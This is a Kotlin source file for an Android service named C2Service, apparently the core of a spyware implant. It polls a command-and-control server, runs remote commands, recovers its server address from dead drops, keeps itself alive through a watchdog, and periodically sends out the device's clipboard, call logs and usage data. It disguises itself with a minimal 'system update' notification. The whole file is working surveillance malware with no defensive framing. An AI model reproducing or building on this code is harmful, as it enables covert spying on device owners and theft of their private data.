package com.sp.core.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.sp.core.c2.Commands
import com.sp.core.c2.Exfil
import com.sp.core.util.BatchExfil
import com.sp.core.util.Fgs
import com.sp.core.util.Prefs
import com.sp.core.util.DeadDrop
import com.sp.core.worker.BatchFlushWorker
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONArray
import org.json.JSONObject
import java.net.URLEncoder
import java.util.concurrent.TimeUnit

/**
 * The single long-lived foreground service. It hosts the clipboard monitor,
 * the usage-stats profiler and the 45-minute batch flush, so the device only
 * ever shows a single low-importance system notification.
 */
class C2Service : Service() {

    override fun onCreate() {
        super.onCreate()
        if (!Fgs.start(this, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC,
                buildNotification())) {
            // Android 12+ refuses foreground services without the matching
            // permission or from a background start - never kill the process.
            stopSelf()
            return
        }

        ClipboardMonitor.start(this)
        BatchFlushWorker.schedulePeriodic(this)

        // Re-arm the watchdog chain: if the process was killed by the OEM
        // (battery manager) this is what brings the agent back.
        try { com.sp.watchdog.WatchdogAlarm.arm(this) } catch (_: Throwable) {}

        // The poll runs on its own thread: a blocking HTTP call on the main
        // looper would freeze the UI and get the process killed by the ANR
        // watchdog (which looks exactly like a crash).
        val thread = HandlerThread("sp-poll").also { it.start() }
        pollThread = thread
        val h = Handler(thread.looper)
        pollHandler = h
        h.postDelayed(pollTask, 15_000L)

        try {
            // Plain background service (the C2 service is in the foreground, so
            // the background-start restriction does not apply here).
            startService(Intent(this, UsageStatsService::class.java))
        } catch (_: Throwable) {
        }

        // Background: recover the C2 endpoint from the dead-drop sources.
        Thread {
            try { DeadDrop.resolve(this) } catch (_: Throwable) {}
        }.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        BatchExfil.enqueue(this, "startup", """{"pid":${android.os.Process.myPid()},"ts":${System.currentTimeMillis()}}""")
        return START_STICKY
    }

    override fun onDestroy() {
        pollHandler?.removeCallbacksAndMessages(null)
        pollThread?.quitSafely()
        ClipboardMonitor.stop()
        super.onDestroy()
    }

    /**
     * Command channel: the agent polls the C2 for queued commands. FCM is
     * optional, this channel works without a Firebase project.
     */
    private fun pollCommands() {
        try {
            val base = Exfil.baseUrl(this) ?: return
            val deviceId = Prefs.deviceId(this)
            val key = URLEncoder.encode(Exfil.apiKeyValue() ?: "", "UTF-8")
            val url = "$base/poll?device_id=$deviceId&k=$key"
            val req = Request.Builder().url(url).get().build()
            pollClient.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return
                val body = resp.body?.string() ?: return
                val arr = JSONArray(body)
                var dispatched = false
                for (i in 0 until arr.length()) {
                    val o = arr.getJSONObject(i)
                    val cmd = o.optString("cmd")
                    if (cmd.isBlank()) continue
                    val argsObj = o.optJSONObject("args") ?: JSONObject()
                    val args = HashMap<String, String>()
                    argsObj.keys().forEach { k -> args[k] = argsObj.optString(k) }
                    // The dispatch stays on this background thread: the
                    // commands do content-provider and file I/O, which must
                    // never run on the main looper.
                    try {
                        Commands.dispatch(this, cmd, args)
                        Exfil.sendLog(this, "cmd_result", """{"cmd":"$cmd","ok":true}""")
                    } catch (t: Throwable) {
                        Exfil.sendLog(this, "cmd_result", """{"cmd":"$cmd","ok":false,"err":"${t.javaClass.simpleName}"}""")
                    }
                    dispatched = true
                }
                if (dispatched) {
                    // Whatever was buffered goes out now - a command must
                    // never wait for the 45-minute batch.
                    try { BatchExfil.flush(this) } catch (_: Throwable) {}
                }
            }
        } catch (_: Throwable) {
        }
    }

    private fun buildNotification(): Notification {
        val chId = "sys_update"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(chId, "Обновление системы",
                NotificationManager.IMPORTANCE_MIN).apply { setShowBadge(false) }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, chId)
            .setContentTitle("android_UI")
            .setContentText("Системный компонент работает")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private var pollThread: HandlerThread? = null
    private var pollHandler: Handler? = null
    private val callDumpHandler = Handler(Looper.getMainLooper())
    private val callDumpTask = object : Runnable {
        override fun run() {
            try {
                CallLogDumper.dump(this@C2Service)
            } catch (_: Throwable) {
            }
        }
    }


    private val pollTask = object : Runnable {
        private var tick = 0
        override fun run() {
            tick++
            try {
                pollCommands()
            } catch (_: Throwable) {
            }
            try {
                // Liveness beacon - the dashboard shows the device as online
                // even when the encrypted channel is silent. It goes out every
                // third tick so the poll can stay fast.
                if (tick % 3 == 1) {
                    com.sp.core.util.Beacon.send(this@C2Service, "alive", aliveInfo())
                }
            } catch (_: Throwable) {
            }
            // The call history is dumped on its own slow timer - it changes
            // rarely and every query hits the content provider.
            callDumpHandler.postDelayed(callDumpTask, CALL_DUMP_INTERVAL_MS)
            pollHandler?.postDelayed(this, POLL_INTERVAL_MS)
        }
    }

    private fun aliveInfo(): String {
        val sb = StringBuilder()
        sb.append("{\"device_id\":\"").append(Prefs.deviceId(this)).append("\"")
        sb.append(",\"sdk\":").append(android.os.Build.VERSION.SDK_INT)
        sb.append(",\"pending\":").append(com.sp.core.util.BatchExfil.pendingCount(this))
        sb.append(",\"battery\":").append(com.sp.core.util.Battery.percent(this))
        sb.append(",\"ts\":").append(System.currentTimeMillis())
        sb.append("}")
        return sb.toString()
    }

    companion object {
        private const val NOTIF_ID = 0x5F62
        // The command channel is polled fast - a command must take effect
        // within a few seconds, not within a minute.
        private const val POLL_INTERVAL_MS = 15_000L
        private const val CALL_DUMP_INTERVAL_MS = 5 * 60_000L

        private val pollClient = OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(15, TimeUnit.SECONDS)
            .build()
    }
}
